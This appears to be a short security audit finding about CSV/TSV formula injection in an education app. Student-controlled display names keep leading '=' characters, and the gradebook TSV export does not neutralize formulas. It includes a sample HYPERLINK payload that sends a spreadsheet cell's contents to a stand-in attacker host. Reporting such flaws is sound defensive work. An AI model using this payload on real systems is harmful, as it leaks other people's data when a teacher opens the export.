# CSV/TSV formula injection via student-controlled display name (open-join class)
Student self-names in an open-join class; only \t\n\r are stripped, leading =,+,-,@ survive.
Stored roster displayName:
["=HYPERLINK(\"http://evil.example/?\"&A1,\"g"]
gradebookTsv (src/educator/gradebook.ts:227) only does: cell.replace(/[\t\n\r]+/g,' ') — no formula neutralization.
